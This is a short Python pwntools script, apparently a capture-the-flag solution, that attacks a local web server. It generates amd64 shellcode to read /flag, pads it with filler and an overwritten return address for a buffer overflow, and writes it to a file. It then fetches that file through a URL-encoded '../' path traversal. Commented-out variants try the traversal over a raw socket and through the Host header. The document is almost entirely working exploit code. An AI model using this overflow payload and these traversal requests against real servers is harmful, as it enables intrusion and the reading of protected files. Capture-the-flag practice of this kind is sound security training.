from pwn import *
import requests
context.arch = "amd64"
shellcode = asm(shellcraft.cat("/flag"))

shellcode += b"A"*(0x1f86 - len(shellcode)) + 0x00007fffffff9ff2.to_bytes(8, "little")

with open("test.txt", "wb+") as fd:
    fd.write(shellcode)


url = "http://localhost:80/%2e%2e/%2e%2e/%2e%2e/home/hacker/test.txt"
response = requests.get(url)
print(response.text)


# import socket

# # 构造原始 HTTP 请求
# request = (
#     "GET /../../../home/hacker/test.txt HTTP/1.1\r\n"
#     "Host: localhost\r\n"
#     "Connection: close\r\n"
#     "\r\n"
# )

# # 使用 socket 发送请求
# with socket.create_connection(("localhost", 80)) as s:
#     s.sendall(request.encode())
#     response = s.recv(4096)

# print(response.decode())



# import requests

# headers = {
#     "Host": "../../../home/hacker/msg.c"
# }
# response = requests.get("http://localhost:80/", headers=headers)
# print(response.text)
